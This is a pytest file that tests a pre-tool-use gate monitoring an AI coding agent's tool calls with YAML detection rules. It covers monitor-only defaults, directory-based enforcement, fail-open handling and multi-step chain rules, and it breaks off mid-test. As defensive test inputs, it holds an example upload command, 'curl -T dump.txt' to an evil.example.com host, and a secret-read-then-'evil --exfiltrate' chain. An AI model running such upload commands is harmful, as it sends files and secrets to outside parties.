# CUI // SP-CTI
"""The pre-tool-use gate: monitor-only by default, enforcement by directory.

What these tests are actually defending (agov-det-06):

1. **A match records and allows.** The whole design rests on a monitor period
   during which rules are wrong and nothing breaks. A finding that is not
   written is a monitor period that taught nobody anything, and a match that
   blocks by default is the failure this card exists to avoid.
2. **Enforcement authority is a DIRECTORY, not a field.** `enforce: true` on a
   file under `args/agent_rules/` must be inert. If authority were the field,
   then a bad merge, a rogue edit or a well-meaning PR could turn the shipped
   pack into a live blocklist across every session — and `pr_watcher.py`
   auto-merges any CI-green `kanban/*` branch, so "someone will notice in
   review" is not a control. The test that flips the field on a shipped-pack
   file and demands the call still succeeds is the load-bearing one here.
3. **The gate fails OPEN.** Every other check in `shared_checks.py` encodes a
   fixed, reviewed judgement and fails closed on a match. This one runs
   operator-authored YAML that may have landed five minutes ago, and it runs
   before EVERY tool call. A rule pack that cannot be parsed must leave a
   session exactly as protected as it was before AGOV, not stop it working.
4. **The cheap paths stay cheap.** Asserted structurally — "the engine was never
   imported", "the sequence module was never imported", "no trail file was
   written" — rather than with a stopwatch, because a wall-clock assertion on a
   shared CI runner is a flake generator. The measured numbers live in the PR.

Not tested here: the loader's own semantics (tests/test_agov_rules.py), the
chain evaluator's partition and window rules (tests/test_agov_sequence.py), or
the findings table's schema parity (tests/test_agov_agent_findings.py).
"""
from __future__ import annotations

import importlib
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from tests import _sql_compat  # noqa: E402
from tools.agent_detect import gate  # noqa: E402
from tools.agent_detect import rules as rules_mod  # noqa: E402

MIGRATION = (
    REPO_ROOT / "tools" / "db" / "migrations" / "20260809201320_agov_agent_findings" / "up.py"
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------
def _rule_yaml(rule_id: str, *, enforce: bool, deny_message: str) -> str:
    """One minimal single-event rule: a Read of a file named `secret.txt`."""
    return textwrap.dedent(
        f"""
        id: {rule_id}
        version: "1"
        title: Read of the canary file
        severity: high
        tags: [T1552.001]
        enabled: true
        enforce: {"true" if enforce else "false"}
        deny_message: "{deny_message}"
        expr:
          event_type:
            - file.read
          file_path_glob:
            - "**/secret.txt"
            - "secret.txt"
        """
    ).strip()


@pytest.fixture
def packs(tmp_path, monkeypatch):
    """A detect directory and an operator directory, both empty, both wired.

    Separate `tmp_path` subdirectories per test so the loader's stat-signature
    cache can never serve one test's rules to another.
    """
    detect = tmp_path / "pack"
    operator = tmp_path / "operator"
    detect.mkdir()
    operator.mkdir()
    monkeypatch.setenv(rules_mod.RULES_DIR_ENV, str(detect))
    monkeypatch.setenv(gate.ENFORCE_DIR_ENV, str(operator))
    monkeypatch.setenv(gate.TRAIL_DIR_ENV, str(tmp_path / "trail"))
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    monkeypatch.delenv(gate.ENABLE_ENV, raising=False)
    rules_mod.clear_cache()
    gate.reset()
    yield detect, operator
    rules_mod.clear_cache()
    gate.reset()


@pytest.fixture
def findings_db(tmp_path, monkeypatch):
    """A real `agent_findings` table, built by the migration's own DDL.

    Patched in via `importlib` + `setattr` rather than monkeypatch's dotted-string
    form: `tools.` is a shim onto `icdev.tools.`, so the string form can bind a
    different module object than the one `findings.record_finding` imports.
    The connection translates `%s` -> `?` the way `StorageConnection` does, so
    the test exercises the production INSERT rather than a rewritten one.
    """
    spec = importlib.util.spec_from_file_location("agov_findings_migration", MIGRATION)
    migration = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = migration
    spec.loader.exec_module(migration)

    db_path = tmp_path / "findings.db"
    seed = _sql_compat.connect(str(db_path))
    seed.execute(migration._DDL)
    seed.commit()
    seed.close()

    storage = importlib.import_module("tools.db.storage")

    class _Conn:
        """Wraps a fresh translating connection; `close()` is a no-op so the
        caller's `finally: conn.close()` cannot end the test's database."""

        def __init__(self):
            self._inner = _sql_compat.connect(str(db_path))

        def __getattr__(self, name):
            return getattr(self._inner, name)

        def close(self):
            self._inner.commit()
            self._inner.close()

    monkeypatch.setattr(storage, "get_connection", lambda *a, **k: _Conn())
    monkeypatch.setattr(storage, "table_exists", lambda conn, name: name == "agent_findings")
    return db_path


def _rows(db_path):
    conn = _sql_compat.connect(str(db_path))
    try:
        return conn.execute(
            "SELECT rule_id, severity, session_id, event_ids, enforced, decision "
            "FROM agent_findings ORDER BY rule_id"
        ).fetchall()
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# 1. Monitor-only is the default, and it records
# ---------------------------------------------------------------------------
def test_a_monitor_only_match_records_a_finding_and_allows_the_call(packs, findings_db):
    """The acceptance case. A match is an observation, not a veto."""
    detect, _operator = packs
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="never shown"),
        encoding="utf-8",
    )

    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-monitor"
    )

    assert decision.allowed is True
    assert decision.reason == ""
    assert [m["rule_id"] for m in decision.matches] == ["secrets.canary"]

    rows = _rows(findings_db)
    assert len(rows) == 1, f"expected exactly one finding, got {rows}"
    rule_id, severity, session_id, event_ids, enforced, dec = rows[0]
    assert rule_id == "secrets.canary"
    assert severity == "high"
    assert session_id == "sess-monitor"
    assert len(json.loads(event_ids)) == 1
    assert not enforced
    assert dec == "observed"


def test_the_finding_names_the_event_the_rule_actually_matched(packs, findings_db):
    """`event_ids` is what makes a finding reviewable rather than an assertion."""
    detect, _operator = packs
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-ids"
    )
    stored = json.loads(_rows(findings_db)[0][3])
    assert stored == decision.matches[0]["event_ids"]


def test_a_call_nothing_matches_writes_nothing(packs, findings_db):
    detect, _operator = packs
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/README.md"}, session_id="sess-quiet"
    )
    assert decision.allowed is True
    assert decision.matches == ()
    assert _rows(findings_db) == []


# ---------------------------------------------------------------------------
# 2. Enforcement authority is the directory
# ---------------------------------------------------------------------------
def test_an_enforcing_rule_in_the_operator_directory_blocks_with_its_deny_message(
    packs, findings_db
):
    """The acceptance case for enforcement. The message must reach the caller
    verbatim — it is the only instruction a blocked agent gets."""
    _detect, operator = packs
    (operator / "canary.yaml").write_text(
        _rule_yaml(
            "secrets.canary", enforce=True, deny_message="Load secrets via the provider."
        ),
        encoding="utf-8",
    )

    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-deny"
    )

    assert decision.allowed is False
    assert "Load secrets via the provider." in decision.reason
    assert decision.reason.startswith("BLOCKED:")
    assert decision.rule_id == "secrets.canary"

    rows = _rows(findings_db)
    assert len(rows) == 1
    assert rows[0][4], "a blocked call must be recorded as enforced"
    assert rows[0][5] == "denied"


def test_enforce_true_in_the_shipped_pack_cannot_block(packs, findings_db):
    """THE load-bearing test.

    Byte-for-byte the rule that blocks from the operator directory, placed in the
    detect directory instead. It must be evaluated — the finding proves the same
    matcher ran — and it must not block. Authority is where the file lives.
    """
    detect, _operator = packs
    body = _rule_yaml("secrets.canary", enforce=True, deny_message="Load secrets via the provider.")
    (detect / "canary.yaml").write_text(body, encoding="utf-8")

    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-flipped"
    )

    assert decision.allowed is True, (
        "a rule outside the operator directory blocked a call; enforcement "
        "authority has become a field rather than a directory"
    )
    assert decision.reason == ""
    assert decision.rule_id == ""
    assert [m["rule_id"] for m in decision.matches] == ["secrets.canary"]
    assert decision.matches[0]["enforce"] is False

    rows = _rows(findings_db)
    assert len(rows) == 1
    assert not rows[0][4]
    assert rows[0][5] == "observed"


def test_the_same_rule_body_matches_identically_from_either_directory(packs):
    """Detection and enforcement evaluate the SAME matcher.

    Only the consequence differs. If the two paths could disagree about WHAT
    matches, a monitor period would tell an operator nothing about what
    enforcing that rule would do.
    """
    detect, operator = packs
    body = _rule_yaml("secrets.canary", enforce=True, deny_message="stop")
    (detect / "canary.yaml").write_text(body, encoding="utf-8")
    monitored = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="s", record=False
    )
    (detect / "canary.yaml").unlink()
    (operator / "canary.yaml").write_text(body, encoding="utf-8")
    rules_mod.clear_cache()
    enforced = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="s", record=False
    )

    assert [m["rule_id"] for m in monitored.matches] == [m["rule_id"] for m in enforced.matches]
    assert monitored.matches[0]["matched_keys"] == enforced.matches[0]["matched_keys"]
    assert monitored.allowed is True and enforced.allowed is False


def test_the_shipped_pack_cannot_block_with_an_empty_operator_directory(tmp_path, monkeypatch):
    """Against the REAL `args/agent_rules/`, not a fixture.

    Exercises the tamper rule, which fires on any write under `.claude/hooks/**`
    — including the write this very card made. It must be recorded and allowed.
    """
    monkeypatch.delenv(rules_mod.RULES_DIR_ENV, raising=False)
    empty = tmp_path / "operator"
    empty.mkdir()
    monkeypatch.setenv(gate.ENFORCE_DIR_ENV, str(empty))
    monkeypatch.setenv(gate.TRAIL_DIR_ENV, str(tmp_path / "trail"))
    rules_mod.clear_cache()

    decision = gate.evaluate_tool_call(
        "Write",
        {"file_path": ".claude/hooks/pre_tool_use.py", "content": "x"},
        session_id="sess-real",
        record=False,
    )
    assert decision.allowed is True
    assert "tamper.control_surface_write" in [m["rule_id"] for m in decision.matches]


def test_the_operator_directory_ships_with_no_rule_files():
    """`args/agent_rules_enforce/` is the default enforce dir. If a rule file ever
    lands in it, every checkout of ICDEV starts blocking on merge."""
    shipped = REPO_ROOT / "args" / gate.ENFORCE_DIRNAME
    assert shipped.is_dir(), "the default operator directory must exist, even empty"
    stray = [p.name for p in shipped.rglob("*") if p.suffix in (".yaml", ".yml")]
    assert stray == [], f"the shipped operator directory must be empty of rules, found {stray}"


# ---------------------------------------------------------------------------
# 3. Cheap paths stay cheap — asserted structurally
# ---------------------------------------------------------------------------
def _subprocess_probe(body: str, env: dict) -> dict:
    """Run `body` in a bare interpreter and return its JSON stdout.

    A subprocess because the assertions are about what is in `sys.modules`, and
    the pytest process has already imported everything.
    """
    script = textwrap.dedent(body)
    full_env = {**os.environ, **env, "PYTHONPATH": str(REPO_ROOT)}
    proc = subprocess.run(
        [sys.executable, "-c", script],
        capture_output=True,
        text=True,
        cwd=str(REPO_ROOT),
        env=full_env,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout.strip().splitlines()[-1])


def test_with_no_rules_anywhere_the_engine_is_never_imported(tmp_path):
    """The zero-rule fast path. Two os.walks and a return — no YAML, no engine.

    This is the state of a deployment that has not opted in, and the state of the
    operator directory in every deployment. It has to cost nothing.
    """
    detect = tmp_path / "pack"
    operator = tmp_path / "operator"
    detect.mkdir()
    operator.mkdir()
    result = _subprocess_probe(
        """
        import json, sys
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "g", "tools/agent_detect/gate.py")
        gate = importlib.util.module_from_spec(spec)
        sys.modules["g"] = gate
        spec.loader.exec_module(gate)
        d = gate.evaluate_tool_call("Read", {"file_path": "/x/secret.txt"})
        print(json.dumps({
            "skipped": d.skipped,
            "allowed": d.allowed,
            "tools_imported": "tools" in sys.modules,
            "rules_imported": "tools.agent_detect.rules" in sys.modules,
        }))
        """,
        {
            rules_mod.RULES_DIR_ENV: str(detect),
            gate.ENFORCE_DIR_ENV: str(operator),
        },
    )
    assert result["skipped"] == "no rules"
    assert result["allowed"] is True
    assert result["rules_imported"] is False
    assert result["tools_imported"] is False, (
        "the `tools` package was imported on the zero-rule path; that executes "
        "the compatibility shim (92ms) before every single tool call"
    )


def test_loading_the_engine_does_not_execute_the_tools_shim(tmp_path):
    """Even WITH rules loaded, `icdev.tools.llm.router` must not be imported.

    That import is what makes `import tools` cost 92ms, and it is why this hook
    loads everything by path. A future first-party import at module scope in
    rules/sequence/findings would silently reintroduce it.
    """
    detect = tmp_path / "pack"
    detect.mkdir()
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    operator = tmp_path / "operator"
    operator.mkdir()
    result = _subprocess_probe(
        """
        import json, sys
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "g", "tools/agent_detect/gate.py")
        gate = importlib.util.module_from_spec(spec)
        sys.modules["g"] = gate
        spec.loader.exec_module(gate)
        d = gate.evaluate_tool_call(
            "Read", {"file_path": "/x/secret.txt"}, record=False)
        print(json.dumps({
            "matched": [m["rule_id"] for m in d.matches],
            "skipped": d.skipped,
            "shim": "icdev.tools.llm.router" in sys.modules,
            "ndjson_logger": bool(getattr(
                sys.modules.get("tools.logging.icdev_logger"), "__file__", None)),
        }))
        """,
        {
            rules_mod.RULES_DIR_ENV: str(detect),
            gate.ENFORCE_DIR_ENV: str(operator),
            gate.TRAIL_DIR_ENV: str(tmp_path / "trail"),
        },
    )
    assert result["matched"] == ["secrets.canary"], result
    assert result["shim"] is False, (
        "icdev.tools.llm.router was imported into the pre-tool-use hook"
    )
    assert result["ndjson_logger"] is False, (
        "the NDJSON logger (43ms of rotating file handlers) was imported into a "
        "process that lives for one tool call"
    )


def test_no_chain_rule_means_no_sequence_import_and_no_trail(packs):
    """`sequence` is 8ms of import plus a file read and a file write per call.

    A pack with no `sequence:` rule has no consumer for any of it.
    """
    detect, _operator = packs
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-noseq", record=False
    )
    trail = gate.trail_dir()
    assert not trail.exists() or list(trail.iterdir()) == [], (
        "a trail was written for a pack with no chain rule"
    )


def test_the_trail_is_bounded(packs, monkeypatch):
    """A session trail that grows without bound turns a bounded tail read into
    an unbounded one after a long session."""
    _detect, _operator = packs
    monkeypatch.setattr(gate, "TRAIL_MAX_BYTES", 4096)
    monkeypatch.setattr(gate, "TRAIL_MAX_EVENTS", 16)
    for index in range(400):
        gate.append_trail(
            {
                "event_id": f"e{index}",
                "session_id": "sess-trail",
                "ts": "2026-08-09T00:00:00+00:00",
                "command": "x" * 64,
            }
        )
    path = gate._trail_path("sess-trail")
    assert path.stat().st_size <= gate.TRAIL_MAX_BYTES * 2
    tail = gate.read_trail("sess-trail", 16)
    assert len(tail) == 16
    assert tail[-1]["event_id"] == "e399", "the tail must end at the newest event"


# ---------------------------------------------------------------------------
# 3b. The JSON side-cache: same rules, no PyYAML
# ---------------------------------------------------------------------------
def test_the_side_cache_produces_the_same_ruleset_as_reading_the_yaml(tmp_path, monkeypatch):
    detect = tmp_path / "pack"
    detect.mkdir()
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    for index in range(3):
        (detect / f"r{index}.yaml").write_text(
            _rule_yaml(f"secrets.canary{index}", enforce=False, deny_message="x"),
            encoding="utf-8",
        )

    rules_mod.clear_cache()
    from_yaml = rules_mod.load_rules(detect)
    rules_mod.clear_cache()
    rules_mod.load_rules_fast(detect)      # populates the cache
    rules_mod.clear_cache()
    from_cache = rules_mod.load_rules_fast(detect)   # and now reads it

    assert rules_mod.disk_cache_path(detect).exists()
    assert [r.rule_id for r in from_cache.rules] == [r.rule_id for r in from_yaml.rules]
    assert [r.expr.keys for r in from_cache.rules] == [r.expr.keys for r in from_yaml.rules]
    assert [r.enforce for r in from_cache.rules] == [r.enforce for r in from_yaml.rules]


def test_an_edited_rule_invalidates_the_cache(tmp_path, monkeypatch):
    """The signature is mtime+size per file. An operator who edits a rule and
    sees the old behaviour would stop trusting the engine entirely."""
    detect = tmp_path / "pack"
    detect.mkdir()
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    target = detect / "r.yaml"
    target.write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    rules_mod.clear_cache()
    assert len(rules_mod.load_rules_fast(detect)) == 1

    target.write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x").replace(
            "secret.txt", "other.txt"
        ),
        encoding="utf-8",
    )
    os.utime(target, (0, 0))  # force a signature change even on a coarse clock
    rules_mod.clear_cache()
    refreshed = rules_mod.load_rules_fast(detect)
    assert "other.txt" in str(refreshed.rules[0].expr.clauses[1].values)


def test_a_corrupt_cache_falls_back_to_the_yaml(tmp_path, monkeypatch):
    detect = tmp_path / "pack"
    detect.mkdir()
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    (detect / "r.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    rules_mod.clear_cache()
    rules_mod.load_rules_fast(detect)

    rules_mod.disk_cache_path(detect).write_text("{not json at all", encoding="utf-8")
    rules_mod.clear_cache()
    assert [r.rule_id for r in rules_mod.load_rules_fast(detect).rules] == ["secrets.canary"]


def test_a_cached_document_still_has_to_survive_the_compiler(tmp_path, monkeypatch):
    """The cache stores DOCUMENTS, not compiled rules. Everything that decides
    what a rule matches — and whether it is a rule at all — still runs."""
    detect = tmp_path / "pack"
    detect.mkdir()
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    (detect / "r.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    rules_mod.clear_cache()
    rules_mod.load_rules_fast(detect)

    cache_file = rules_mod.disk_cache_path(detect)
    payload = json.loads(cache_file.read_text(encoding="utf-8"))
    payload["documents"][0][1]["expr"]["totally_unknown_key"] = ["x"]
    cache_file.write_text(json.dumps(payload), encoding="utf-8")

    rules_mod.clear_cache()
    loaded = rules_mod.load_rules_fast(detect)
    assert loaded.rules == (), "an unknown matcher key must invalidate the whole rule"
    assert loaded.errors, "and it must be reported, not silently dropped"


def test_the_operator_directory_is_never_given_a_cache_file(packs, tmp_path, monkeypatch):
    """No blocking decision is ever taken from a cached document. If the enforce
    directory had a cache, a process that could write it could suppress a block."""
    _detect, operator = packs
    monkeypatch.setenv(rules_mod.CACHE_DIR_ENV, str(tmp_path / "cache"))
    (operator / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=True, deny_message="stop"), encoding="utf-8"
    )
    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="s", record=False
    )
    assert decision.allowed is False
    assert not rules_mod.disk_cache_path(operator).exists(), (
        "the operator enforcement directory was given a JSON side-cache"
    )


# ---------------------------------------------------------------------------
# 4. Fail open
# ---------------------------------------------------------------------------
def test_the_kill_switch_takes_the_gate_out_of_the_path(packs, monkeypatch):
    _detect, operator = packs
    (operator / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=True, deny_message="stop"), encoding="utf-8"
    )
    monkeypatch.setenv(gate.ENABLE_ENV, "0")
    decision = gate.evaluate_tool_call("Read", {"file_path": "/repo/secret.txt"})
    assert decision.allowed is True
    assert decision.skipped == "disabled"


def test_an_unparseable_rule_file_does_not_stop_the_session(packs):
    """One broken file must cost its own rule, not the tool call."""
    detect, _operator = packs
    (detect / "broken.yaml").write_text("id: [this is: not: a rule", encoding="utf-8")
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )
    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="s", record=False
    )
    assert decision.allowed is True
    assert [m["rule_id"] for m in decision.matches] == ["secrets.canary"]


def test_an_engine_that_raises_fails_open(packs, monkeypatch):
    """The gate runs operator YAML before every tool call. An internal fault
    must leave the caller as protected as it was, never wedge it."""
    detect, _operator = packs
    (detect / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=False, deny_message="x"), encoding="utf-8"
    )

    def boom(*_a, **_k):
        raise RuntimeError("engine exploded")

    monkeypatch.setattr(gate, "_engine", boom)
    decision = gate.evaluate_tool_call("Read", {"file_path": "/repo/secret.txt"})
    assert decision.allowed is True
    assert decision.skipped.startswith("error:")


def test_shared_checks_returns_none_when_the_gate_module_is_missing(monkeypatch):
    shared = importlib.import_module("tools.hooks.shared_checks")
    shared.reset_agent_gate()
    monkeypatch.setattr(shared, "_agent_gate", lambda _root: None)
    assert shared.check_agent_rules("Read", {"file_path": "/x/.env"}) is None


# ---------------------------------------------------------------------------
# 5. Both seams are wired, and the new check runs LAST
# ---------------------------------------------------------------------------
def test_the_headless_path_runs_the_agent_rule_check_last():
    """`run_pre_tool_check` returns on the FIRST non-empty reason, so position in
    HEADLESS_CHECKS is the scope fence: every hardcoded block decides before the
    rule engine is consulted."""
    hook_compat = importlib.import_module("tools.airgap.hook_compat")
    assert "check_agent_rules" in hook_compat.HEADLESS_CHECKS
    assert hook_compat.HEADLESS_CHECKS[-1] == "check_agent_rules", (
        "the data-driven check must run after every hardcoded one"
    )


def test_the_claude_code_hook_runs_the_agent_rule_check_after_every_hardcoded_block():
    source = (REPO_ROOT / ".claude" / "hooks" / "pre_tool_use.py").read_text(encoding="utf-8")
    body = source[source.index("def main("):]
    position = body.index("check_agent_rules(tool_name, tool_input)")
    for earlier in (
        "is_env_file_access(",
        "is_dangerous_rm_command(",
        "is_append_only_table_modification(",
        "is_direct_sqlite_usage(",
        "check_file_access_tiers(",
        "check_branch_deletion(",
        "check_worktree_path(",
    ):
        assert body.index(earlier) < position, f"{earlier} must decide before the rule engine"


def test_the_hardcoded_blocks_were_not_migrated_onto_the_rule_engine():
    """Scope fence, pinned. Migrating these onto the evaluator in the same change
    as introducing it is how one of them goes missing silently."""
    shared = (REPO_ROOT / "tools" / "hooks" / "shared_checks.py").read_text(encoding="utf-8")
    for name in (
        "def is_env_file_access",
        "def is_dangerous_rm_command",
        "def is_append_only_table_modification",
        "def is_direct_sqlite_usage",
        "def check_file_access_tiers",
        "def check_branch_deletion",
        "def check_worktree_path",
    ):
        assert name in shared, f"{name} disappeared from shared_checks"


def test_run_pre_tool_check_blocks_on_an_operator_rule(tmp_path, monkeypatch):
    """End to end through the headless seam that every non-Claude-Code
    orchestrator calls."""
    hook_compat = importlib.import_module("tools.airgap.hook_compat")
    shared = importlib.import_module("tools.hooks.shared_checks")
    detect = tmp_path / "pack"
    operator = tmp_path / "operator"
    detect.mkdir()
    operator.mkdir()
    (operator / "canary.yaml").write_text(
        _rule_yaml("secrets.canary", enforce=True, deny_message="Use the provider."),
        encoding="utf-8",
    )
    monkeypatch.setenv(rules_mod.RULES_DIR_ENV, str(detect))
    monkeypatch.setenv(gate.ENFORCE_DIR_ENV, str(operator))
    monkeypatch.setenv(gate.TRAIL_DIR_ENV, str(tmp_path / "trail"))
    rules_mod.clear_cache()
    shared.reset_agent_gate()
    gate.reset()

    result = hook_compat.run_pre_tool_check("Read", {"file_path": "/repo/secret.txt"})
    assert result["allowed"] is False
    assert "Use the provider." in result["reason"]

    allowed = hook_compat.run_pre_tool_check("Read", {"file_path": "/repo/README.md"})
    assert allowed["allowed"] is True


def test_run_pre_tool_check_still_allows_ordinary_calls_with_the_real_pack(monkeypatch, tmp_path):
    """The regression that would hurt most: the seed pack, shipped monitor-only,
    silently refusing normal work."""
    hook_compat = importlib.import_module("tools.airgap.hook_compat")
    shared = importlib.import_module("tools.hooks.shared_checks")
    empty = tmp_path / "operator"
    empty.mkdir()
    monkeypatch.delenv(rules_mod.RULES_DIR_ENV, raising=False)
    monkeypatch.setenv(gate.ENFORCE_DIR_ENV, str(empty))
    monkeypatch.setenv(gate.TRAIL_DIR_ENV, str(tmp_path / "trail"))
    rules_mod.clear_cache()
    shared.reset_agent_gate()
    gate.reset()

    for tool, payload in (
        ("Read", {"file_path": "README.md"}),
        ("Bash", {"command": "git status"}),
        ("Write", {"file_path": "docs/notes.md", "content": "hello"}),
    ):
        result = hook_compat.run_pre_tool_check(tool, payload)
        assert result["allowed"] is True, f"{tool} {payload} was refused: {result['reason']}"


# ---------------------------------------------------------------------------
# 6. Event normalization
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "tool_name,payload,expected",
    [
        ("Read", {"file_path": "/a/b.txt"}, "file.read"),
        ("NotebookRead", {"notebook_path": "/a/b.ipynb"}, "file.read"),
        ("Write", {"file_path": "/a/b.txt"}, "file.write"),
        ("Edit", {"file_path": "/a/b.txt"}, "file.write"),
        ("Bash", {"command": "ls"}, "command.exec"),
        ("PowerShell", {"command": "Get-ChildItem"}, "command.exec"),
        ("WebFetch", {"url": "https://example.com"}, "network.fetch"),
        ("SomeFutureTool", {"whatever": 1}, "tool.call"),
    ],
)
def test_tool_calls_map_onto_the_vocabulary_the_rule_pack_uses(tool_name, payload, expected):
    """An unmapped tool still produces an event. Typing it `tool.call` rather
    than dropping it means a rule can be written against a tool this map has
    never heard of; dropping it would make the call invisible to detection."""
    event = normalize = gate.normalize_tool_call(tool_name, payload, session_id="s")
    assert normalize["event_type"] == expected
    assert event["session_id"] == "s"
    assert event["event_id"]
    assert event["ts"].endswith("+00:00")


def test_a_url_is_lifted_out_of_a_shell_command():
    """`url_matches` is how the chain rules exclude localhost. Without this the
    negated form is vacuously true for every `curl`, and a loopback call reads
    as egress."""
    event = gate.normalize_tool_call(
        "Bash", {"command": "curl -T dump.txt https://evil.example.com/upload"}
    )
    assert event["url"] == "https://evil.example.com/upload"
    assert gate.normalize_tool_call("Bash", {"command": "ls -la"})["url"] == ""


def test_a_path_is_passed_through_unrewritten():
    """The pack's globs are written against a full path (`**/.env`) and the hook
    receives absolute paths. Rewriting to a repo-relative form here would stop
    every one of them matching."""
    event = gate.normalize_tool_call("Read", {"file_path": r"C:\repo\.env"})
    assert event["file_path"] == r"C:\repo\.env"


# ---------------------------------------------------------------------------
# 7. Chains, end to end across separate tool calls
# ---------------------------------------------------------------------------
CHAIN_RULE = textwrap.dedent(
    """
    id: chains.canary
    version: "1"
    title: Read the canary, then run a command
    severity: critical
    enabled: true
    enforce: true
    deny_message: "Read a secret then tried to run a command."
    sequence:
      within: 30m
      within_events: 50
      max_matches: 1
      steps:
        - event_type: [file.read]
          file_path_glob: ["**/secret.txt", "secret.txt"]
        - event_type: [command.exec]
          command_matches: ["evil"]
    """
).strip()


def test_a_chain_matches_across_two_separate_tool_calls(packs, findings_db):
    """The capability every pre-AGOV check lacks: neither half is remarkable on
    its own, and the composition is the concern."""
    _detect, operator = packs
    (operator / "chain.yaml").write_text(CHAIN_RULE, encoding="utf-8")

    first = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-chain"
    )
    assert first.allowed is True, "the first step alone must not block"

    second = gate.evaluate_tool_call(
        "Bash", {"command": "evil --exfiltrate"}, session_id="sess-chain"
    )
    assert second.allowed is False
    assert "Read a secret then tried to run a command." in second.reason

    rows = _rows(findings_db)
    assert [r[0] for r in rows] == ["chains.canary"]
    assert json.loads(rows[0][3]) == list(second.matches[0]["event_ids"])


def test_enforce_true_on_a_CHAIN_in_the_shipped_pack_cannot_block_either(packs, findings_db):
    """Directory authority has to hold on the chain path too.

    Worth its own test because the two paths reach the decision differently:
    `SequenceFinding.to_dict()` carries its own `enforced` and `decision` fields
    derived straight from the rule's `enforce`, so a gate that trusted the
    finding rather than overriding it would block here while passing the
    single-event test.
    """
    detect, _operator = packs
    (detect / "chain.yaml").write_text(CHAIN_RULE, encoding="utf-8")  # enforce: true

    gate.evaluate_tool_call("Read", {"file_path": "/repo/secret.txt"}, session_id="sess-cf")
    decision = gate.evaluate_tool_call(
        "Bash", {"command": "evil --exfiltrate"}, session_id="sess-cf"
    )

    assert decision.allowed is True, (
        "a chain rule outside the operator directory blocked a call"
    )
    assert [m["rule_id"] for m in decision.matches] == ["chains.canary"]
    assert decision.matches[0]["enforce"] is False

    rows = _rows(findings_db)
    assert [r[0] for r in rows] == ["chains.canary"]
    assert not rows[0][4], "recorded as enforced despite living outside the operator directory"
    assert rows[0][5] == "observed"


def test_a_chain_does_not_span_two_sessions(packs):
    """ICDEV runs many concurrent sessions against one database. A chain that
    crossed sessions would report session A's read plus session B's command,
    continuously, and discredit the whole pack on its first day."""
    _detect, operator = packs
    (operator / "chain.yaml").write_text(CHAIN_RULE, encoding="utf-8")

    gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-A", record=False
    )
    decision = gate.evaluate_tool_call(
        "Bash", {"command": "evil --exfiltrate"}, session_id="sess-B", record=False
    )
    assert decision.allowed is True
    assert decision.matches == ()


def test_a_chain_does_not_fire_when_the_steps_happen_in_the_wrong_order(packs):
    """Steps are ordered. Running the command first and reading the secret after
    is not the pattern the rule describes, and the prefilter that makes the chain
    pass affordable must not have quietly turned it into an unordered set."""
    _detect, operator = packs
    (operator / "chain.yaml").write_text(CHAIN_RULE, encoding="utf-8")

    gate.evaluate_tool_call(
        "Bash", {"command": "evil --exfiltrate"}, session_id="sess-rev", record=False
    )
    decision = gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-rev", record=False
    )
    assert decision.allowed is True
    assert decision.matches == ()


def test_a_call_that_cannot_be_the_final_step_skips_the_chain_search(packs, monkeypatch):
    """The prefilter, pinned. A rule whose last step does not match this event
    cannot newly complete on this call — the current event is the newest in the
    trail, so it can only ever be the chain's LAST element. Skipping the search
    is what keeps the chain pass off the hot path."""
    _detect, operator = packs
